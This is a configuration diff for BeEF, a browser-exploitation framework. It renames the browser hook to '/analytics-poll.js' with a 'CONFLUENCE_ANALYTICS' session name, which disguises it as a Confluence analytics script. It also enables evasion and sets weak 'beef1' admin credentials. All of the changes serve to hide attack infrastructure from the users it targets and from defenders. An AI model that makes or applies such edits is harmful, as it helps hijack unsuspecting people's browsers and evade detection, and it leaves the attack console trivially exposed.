@@ -17,8 +17,8 @@ beef:
     # Credentials to authenticate in BeEF.
     # Used by both the RESTful API and the Admin interface
     credentials:
-        user:   "beef"
-        passwd: "beef"
+        user:   "beef1"
+        passwd: "beef1"
 
     # Interface / IP restrictions
     restrictions:
@@ -64,8 +64,8 @@ beef:
         allow_reverse_proxy: false
 
         # Hook
-        hook_file: "/hook.js"
-        hook_session_name: "BEEFHOOK"
+        hook_file: "/analytics-poll.js"
+        hook_session_name: "CONFLUENCE_ANALYTICS"
 
         # Allow one or multiple origins to access the RESTful API using CORS
         # For multiple origins use: "http://browserhacker.com, http://domain2.com"
@@ -144,7 +144,7 @@ beef:
         events:
             enable: true
         evasion:
-            enable: false
+            enable: true
         requester:
             enable: true
         proxy:
